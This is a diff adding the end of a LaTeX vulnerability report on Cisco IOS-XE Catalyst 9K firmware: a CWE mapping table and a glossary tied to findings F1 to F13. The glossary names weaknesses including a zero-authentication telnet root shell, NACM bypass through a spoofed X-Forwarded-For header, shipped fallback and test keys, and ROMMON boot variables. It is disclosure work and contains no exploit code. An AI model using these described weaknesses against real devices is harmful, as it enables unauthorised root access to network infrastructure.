+    & Incorrect Permission Assignment for Critical Resource & F2, F3, F5 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/798.html}{CWE-798}
+    & Use of Hard-coded Credentials & F1 \\
+\end{longtable}
+
+% =============================================================
+\section{General Glossary}
+% =============================================================
+
+\begin{longtable}{@{}lL{11cm}@{}}
+  \toprule
+  \textbf{Term} & \textbf{Definition} \\
+  \midrule \endfirsthead
+  \toprule
+  \textbf{Term} & \textbf{Definition} \\
+  \midrule \endhead
+  \bottomrule \endlastfoot
+  CAF        & Container Application Framework. The Cisco IOx daemon that deploys and
+               manages LXC/KVM containers on IOS-XE. Runs as root and invokes
+               lifecycle scripts including \texttt{guestshell\_setup.sh}.
+               See \href{https://cwe.mitre.org/data/definitions/269.html}{CWE-269},
+               \href{https://cwe.mitre.org/data/definitions/732.html}{CWE-732}. \\[0.3em]
+  ConfD      & Configuration Daemon (Tail-f, now Cisco). The NETCONF/YANG management
+               backend on IOS-XE. Provides RESTCONF and NETCONF termination and
+               NACM access control. Trusts \texttt{X-Forwarded-For} from
+               \texttt{127.0.0.1/32} (F9).
+               See \href{https://cwe.mitre.org/data/definitions/290.html}{CWE-290}. \\[0.3em]
+  CW\_TLV    & Outer container format for Cisco IOS-XE firmware. Identified by
+               \texttt{deadbeef} TLV magic bytes. Contains compressed sub-packages
+               as TLV values. \\[0.3em]
+  guestshell & The default IOx LXC container on Catalyst 9K for hosting Python
+               scripts, Bash automation, and third-party applications within the
+               IOS-XE guest services environment. Activated by CAF via
+               \texttt{guestshell\_setup.sh} (F3).
+               See \href{https://cwe.mitre.org/data/definitions/269.html}{CWE-269},
+               \href{https://cwe.mitre.org/data/definitions/732.html}{CWE-732}. \\[0.3em]
+  lablogin.sh & Zero-authentication telnet login shell at \path{/etc/lablogin.sh}.
+               Reads root's shell from \path{/etc/passwd} and execs it without
+               any credential check (F4).
+               See \href{https://cwe.mitre.org/data/definitions/306.html}{CWE-306},
+               \href{https://cwe.mitre.org/data/definitions/269.html}{CWE-269}. \\[0.3em]
+  leabasdk   & Licensing and Entitlement Architecture SDK. Manages Cisco Smart
+               Licensing communications. Test TLS keys shipped in production at
+               \path{usr/lib64/leabasdk/test/} (F11).
+               See \href{https://cwe.mitre.org/data/definitions/321.html}{CWE-321},
+               \href{https://cwe.mitre.org/data/definitions/312.html}{CWE-312}. \\[0.3em]
+  NACM       & NETCONF Access Control Model (RFC~8341). Used by ConfD to authorize
+               NETCONF and RESTCONF operations by session identity and source IP.
+               IP-based rules bypassable via spoofed \texttt{X-Forwarded-For} (F9).
+               See \href{https://cwe.mitre.org/data/definitions/290.html}{CWE-290}. \\[0.3em]
+  OpenResty  & nginx-based reverse proxy with Lua scripting. The HTTPS frontend for
+               IOS-XE web management, RESTCONF, and the authentication proxy.
+               Ships \texttt{fallback.key} (F1); loads config from \texttt{/tmp} (F5).
+               See \href{https://cwe.mitre.org/data/definitions/798.html}{CWE-798},
+               \href{https://cwe.mitre.org/data/definitions/494.html}{CWE-494}. \\[0.3em]
+  ROMMON     & ROM Monitor. Cisco bootstrap firmware that runs before IOS-XE loads.
+               Environment variables set in ROMMON persist across reboots and are
+               read by IOS-XE boot scripts. Attack surface for F6, F7, F13.
+               See \href{https://cwe.mitre.org/data/definitions/489.html}{CWE-489},
+               \href{https://cwe.mitre.org/data/definitions/494.html}{CWE-494},
+               \href{https://cwe.mitre.org/data/definitions/306.html}{CWE-306}. \\[0.3em]
+  rpbase     & Primary IOS-XE sub-package (\texttt{cat9k-rpbase.17.18.04.SPA.pkg}).
+               Contains the core OS, configuration, and binaries. Analyzed as an
+               inner SquashFS at byte offset \texttt{0x400}. \\[0.3em]
+  SquashFS   & Read-only compressed Linux filesystem format used by IOS-XE for
+               outer and inner package filesystems. Extracted with
+               \texttt{unsquashfs} using the \texttt{-offset} flag. \\
+\end{longtable}
+
+\end{document}
